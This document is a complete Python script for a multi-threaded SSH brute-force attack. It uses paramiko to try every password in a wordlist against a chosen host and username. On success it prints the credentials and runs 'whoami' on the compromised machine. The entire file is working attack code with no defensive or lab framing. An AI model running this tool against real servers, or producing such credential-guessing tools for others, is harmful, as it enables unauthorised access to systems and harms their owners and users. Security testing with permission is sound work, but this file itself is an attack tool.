# Paramiko is a pure-Python implementation of the SSHv2 protocol, providing both client and server functionality.
#!/usr/bin/env python3
"""
SSH Brute Force Tool
Usage: python ssh_brute_force.py -u <host> --user <username> --password <wordlist>
"""

import termcolor
import sys
import paramiko
import socket
import threading
import time
import pyfiglet
import argparse
from queue import Queue

ascii_banner = pyfiglet.figlet_format("SSH Brute Force")
print(ascii_banner)

def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description="Multi-threaded SSH Login Bruteforce Tool")
    parser.add_argument('-u', '--url', help='SSH host address', required=True)
    parser.add_argument('--user', help='Username for SSH login', required=True)
    parser.add_argument('--password', help='Passwords wordlist file', required=True)
    parser.add_argument('--threads', help='Number of concurrent threads (default: 5)', default=5, type=int)
    parser.add_argument('--timeout', help='Connection timeout in seconds (default: 3)', default=3, type=int)
    parser.add_argument('--port', help='SSH port (default: 22)', default=22, type=int)
    parser.add_argument('--verbose', help='Enable verbose output', action='store_true')
    return parser.parse_args()

# Global variables for thread coordination
found_password = False
found_lock = threading.Lock()
attempt_count = 0
attempt_lock = threading.Lock()

def ssh_connect(password, host, username, port=22, timeout=3, verbose=False):
    """Attempt SSH connection with given credentials"""
    global found_password, attempt_count

    # Check if password already found
    with found_lock:
        if found_password:
            return False

    # Increment attempt counter
    with attempt_lock:
        attempt_count += 1
        current_attempt = attempt_count

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        if verbose:
            print(f"[{current_attempt}] Trying: {username}:{password}")

        ssh.connect(hostname=host, port=port, username=username, 
                   password=password, timeout=timeout, banner_timeout=timeout,
                   auth_timeout=timeout)

        with found_lock:
            if not found_password:
                found_password = True
                print(termcolor.colored(f"\n[+] SUCCESS! Password found: {password}", 'green', attrs=['bold']))
                print(termcolor.colored(f"[+] Credentials: {username}@{host}:{port}", 'green'))
                print(termcolor.colored(f"[+] Login command: ssh {username}@{host} -p {port}", 'green'))

                # Test connection by running a simple command
                try:
                    stdin, stdout, stderr = ssh.exec_command('whoami')
                    result = stdout.read().decode().strip()
                    print(termcolor.colored(f"[+] Connection verified - logged in as: {result}", 'green'))
                except:
                    print(termcolor.colored("[!] Connection successful but command execution failed", 'yellow'))

                return True

    except paramiko.AuthenticationException:
        if verbose:
            print(termcolor.colored(f"[-] Failed: {username}:{password}", 'red'))
        return False
    except paramiko.SSHException as e:
        if verbose:
            print(termcolor.colored(f"[!] SSH Exception with {password}: {str(e)}", 'yellow'))
        return False
    except socket.timeout:
        if verbose:
            print(termcolor.colored(f"[!] Timeout with password: {password}", 'yellow'))
        return False
    except socket.error as e:
        if verbose:
            print(termcolor.colored(f"[!] Socket error with {password}: {str(e)}", 'yellow'))
        return False
    except Exception as e:
        if verbose:
            print(termcolor.colored(f"[!] Unexpected error with {password}: {str(e)}", 'yellow'))
        return False
    finally:
        try:
            ssh.close()
        except:
            pass

def worker(password_queue, host, username, port, timeout, verbose):
    global found_password

    while not password_queue.empty() and not found_password:
        try:
            password = password_queue.get(timeout=1)
            result = ssh_connect(password, host, username, port, timeout, verbose)
            password_queue.task_done()

            if result:
                break

        except:
            break

def test_connection(host, port, timeout):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except:
        return False

def main():
    global found_password, attempt_count

    args = parse_args()
    username = args.user
    host = args.url
    port = args.port
    num_threads = args.threads
    timeout = args.timeout
    verbose = args.verbose

    print(termcolor.colored(f"[*] Starting SSH brute force attack", 'blue', attrs=['bold']))
    print(termcolor.colored(f"[*] Target: {host}:{port}", 'blue'))
    print(termcolor.colored(f"[*] Username: {username}", 'blue'))
    print(termcolor.colored(f"[*] Threads: {num_threads}", 'blue'))
    print(termcolor.colored(f"[*] Timeout: {timeout}s", 'blue'))
    print(termcolor.colored(f"[*] Wordlist: {args.password}", 'blue'))
    print(termcolor.colored(f"[*] Verbose: {verbose}\n", 'blue'))

    # Test connection to target
    print(termcolor.colored("[*] Testing connection to target...", 'cyan'))
    if not test_connection(host, port, timeout):
        print(termcolor.colored(f"[ERROR] Cannot connect to {host}:{port}", 'red'))
        print(termcolor.colored("[ERROR] Please check if SSH service is running", 'red'))
        return
    print(termcolor.colored("[+] Connection test successful\n", 'green'))

    # Read password list
    try:
        with open(args.password, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f.readlines() if line.strip()]
    except Exception as e:
        print(termcolor.colored(f"[ERROR] Reading wordlist file failed: {e}", 'red'))
        return

    if not passwords:
        print(termcolor.colored("[ERROR] No passwords found in wordlist", 'red'))
        return

    print(termcolor.colored(f"[*] Loaded {len(passwords)} passwords\n", 'blue'))

    password_queue = Queue()
    for password in passwords:
        password_queue.put(password)

    threads = []
    start_time = time.time()

    print(termcolor.colored(f"[*] Starting attack with {num_threads} threads...\n", 'cyan'))

    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(password_queue, host, username, port, timeout, verbose))
        t.daemon = True
        t.start()
        threads.append(t)

    # Monitor progress
    try:
        while not password_queue.empty() and not found_password:
            remaining = password_queue.qsize()
            completed = len(passwords) - remaining
            progress = (completed / len(passwords)) * 100

            if not verbose:
                print(f"\r[*] Progress: {progress:.1f}% ({completed}/{len(passwords)}) - Attempts: {attempt_count}", end='', flush=True)

            time.sleep(0.5)

    except KeyboardInterrupt:
        print(termcolor.colored("\n\n[!] Attack interrupted by user", 'yellow'))
        found_password = True

    # Wait for all threads to finish
    for t in threads:
        t.join()

    end_time = time.time()

    print("\n" + "="*60)

    if not found_password:
        print(termcolor.colored(f"[-] Password not found in wordlist", 'red', attrs=['bold']))
        print(termcolor.colored(f"[*] Tried {attempt_count} passwords", 'blue'))

    print(termcolor.colored(f"[*] Attack completed in {end_time - start_time:.2f} seconds", 'blue'))
    print(termcolor.colored(f"[*] Average speed: {attempt_count/(end_time - start_time):.2f} attempts/second", 'blue'))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(termcolor.colored("\n[!] Exiting...", 'yellow'))
        sys.exit(0)
    except Exception as e:
        print(termcolor.colored(f"[ERROR] {str(e)}", 'red'))
        sys.exit(1)
